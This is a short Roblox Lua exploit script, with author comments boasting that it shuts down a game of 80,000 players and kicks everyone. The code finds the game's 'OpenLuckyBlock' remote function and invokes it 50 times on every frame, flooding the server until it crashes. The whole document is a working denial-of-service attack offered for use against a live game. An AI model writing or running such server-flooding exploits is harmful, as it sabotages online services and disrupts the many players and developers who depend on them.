-- 80k player game btw
-- by Vorbescu also shutdowns in 3 secs (kicks all players but u cant see it cause of ur lag very op
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local remote = ReplicatedStorage:WaitForChild("Packages")
    :WaitForChild("_Index")
    :WaitForChild("sleitnick_knit@1.7.0")
    :WaitForChild("knit")
    :WaitForChild("Services")
    :WaitForChild("RunningService")
    :WaitForChild("RF")
    :WaitForChild("OpenLuckyBlock")

local args = {"base1"}

RunService.Heartbeat:Connect(function()
    for i = 1, 50 do
        task.spawn(function()
            remote:InvokeServer(unpack(args))
        end)
    end
end)
